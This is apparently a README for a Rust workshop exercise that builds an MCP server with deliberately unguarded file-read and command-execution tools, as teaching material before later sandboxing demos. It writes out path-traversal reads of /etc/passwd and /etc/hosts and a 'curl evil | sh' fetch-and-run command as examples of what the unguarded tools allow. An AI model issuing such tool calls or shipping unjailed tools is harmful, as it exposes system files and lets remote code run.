# demo01: the tools, with no boundaries yet

demo00 built an MCP server with one harmless tool. demo01 gives it two that are
not harmless: `fs_read`, which reads any file, and `exec_run`, which runs any
command. Nothing here is wrong, exactly. Everything works. That is the problem,
and it is the whole reason the rest of the talk exists.

This is the crime scene from slide 1: `LLM -> raw shell`, dressed up as tool
calls. demo02 through demo04 put the boundaries in.

```bash
cd women-in-rust/demo01
cargo run -- next
```

Same loop as demo00. `next` runs the exercises in order and stops at the first
that needs you. Open the file it names, read the comment at the top, fix the
`TODO`s, run `next` again.

```bash
cargo run -- hint fs_read1
```

## The exercises

| # | File | You learn |
| --- | --- | --- |
| 0 | `exercises/00_intro/intro1.rs` | The whole demo01 server, working and dangerous. Read it once. |
| 1 | `exercises/01_fs/fs_read1.rs` | A tool that reads a file is a function that reads a file. |
| 2 | `exercises/01_fs/fs_read2.rs` | Refuse malformed input with `-32602` — and why that is *not* a jail. |
| 3 | `exercises/02_exec/exec_run1.rs` | A tool that shells out, and the stdio hygiene it still needs. |

Solutions are in `solutions/`, same layout. Try before you look.

## The line this demo is about

Two claims that sound the same and are not:

- **It works.** `fs_read` returns the file. `exec_run` returns the output.
  Every test here passes.
- **It is safe.** It is not. `fs_read {"path": "../../../../etc/passwd"}`
  succeeds. `exec_run {"cmd": "sh", "args": ["-c", "curl evil | sh"]}` succeeds.

demo01 makes the first claim on purpose and refuses the second on purpose. The
one guard you *do* add, in `fs_read2`, rejects an empty path — malformed input,
not an escaping one. That distinction is the hinge the next three demos turn on:

| Demo | Adds | Refuses |
| --- | --- | --- |
| demo02 | a `Sandbox` every tool goes through, `--read-only`, a first `..` check | writes when read-only; the obvious `../` |
| demo03 | the real jail: canonicalize, symlinks, nonexistent-path fallback | every escaping path, including symlinked ones |
| demo04 | the exec allowlist (pinned from PATH at startup), no subshell, a timeout | any binary but the allowlisted few; runaway commands |

## Run it as a server

Any exercise with a real `main` is a server you can talk to by hand:

```bash
cargo run --bin intro1
```

Paste these one line at a time and watch it do the thing it should not:

```json
{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-11-25","capabilities":{},"clientInfo":{"name":"you","version":"0"}}}
{"jsonrpc":"2.0","method":"notifications/initialized"}
{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"fs_read","arguments":{"path":"Cargo.toml"}}}
{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"fs_read","arguments":{"path":"../../../etc/hosts"}}}
```

The third and fourth frames both return a file. One is inside the directory you
started in; the other is not. The server cannot tell the difference, because
nothing in it is looking.

## Commands

| Command | What it does |
| --- | --- |
| `cargo run -- next` | Run the exercises in order; stop at the first that fails. |
| `cargo run -- run NAME` | Check one exercise. |
| `cargo run -- hint NAME` | Print its hint. |
| `cargo run -- list` | List them. |
| `cargo run -- verify` | For CI: every solution passes, every exercise still fails. |

## How it is put together

Same shape as demo00.

- `exercises/` and `solutions/` mirror each other; every file in both is a
  `[[bin]]` in `Cargo.toml`.
- `info.toml` is the exercise order, the hints, and the wire probe's
  conversation.
- `src/main.rs` hands that file to the runner in [`../runner`](../runner/),
  which every demo shares.
- This package is excluded from the repo's root workspace, because its
  exercises are broken on purpose. CI runs `cargo run -- verify` here.

## Where this goes

Everything in [`falcon-mcp`](../../falcon-mcp/) is these two tools with the
boundaries demo02 through demo04 add: `fs_read` resolves its path through a root
jail, `exec_run` checks a binary allowlist and runs under a timeout. The tool
signatures you wrote here do not change. What changes is that a `Sandbox` sits
between them and the OS.
